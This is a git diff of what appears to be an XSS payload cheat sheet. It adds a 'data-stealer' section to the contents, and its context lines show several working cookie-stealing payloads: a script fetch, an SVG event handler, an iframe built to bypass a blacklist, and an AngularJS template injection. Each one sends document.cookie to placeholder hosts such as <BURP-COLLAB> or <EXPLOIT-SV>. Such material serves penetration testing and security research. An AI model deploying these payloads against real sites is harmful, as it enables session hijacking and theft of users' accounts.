@@ -9,6 +9,7 @@
       - [GENERIC-PAYLOADS-POC](#generic-payloads-poc)
       - [BYPASS-RESTRICTIONS](#bypass-restrictions)
       - [COOKIE-STEALER](#cookie-stealer)
+      - [DATA-STEALER](#data-stealer)
       - [SVG-TAGS](#svg-tags)
       - [DOM-POST-MESSAGES](#dom-post-messages)
       - [SINKS-AND-SOURCES](#sinks-and-sources)
@@ -132,14 +133,12 @@ ${document.location='https://<BURP-COLLAB>/?cookies'+document.cookie;}
 <script>fetch(`https://<EXPLOIT-SV>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
 
 <svg><animateTransform onbegin=fetch('https://<BURP-COLLAB>?cookie='+btoa(document.cookie))>
-```
 
 // tags / atributtes blacklisted
 <iframe
   src="https://<IP>>/?search="><body onresize=fetch('https://<EXPLOIT-SV>/exploit/?cookie='+btoa(document.cookie))>"
   onload="this.style.width='100px' ">
 </iframe>
-
 
 // angularJS
 {{$on.constructor('document.location="https://<COLLABORATOR||EXPLOIT-SV>?cookie="+document.cookie')()}}
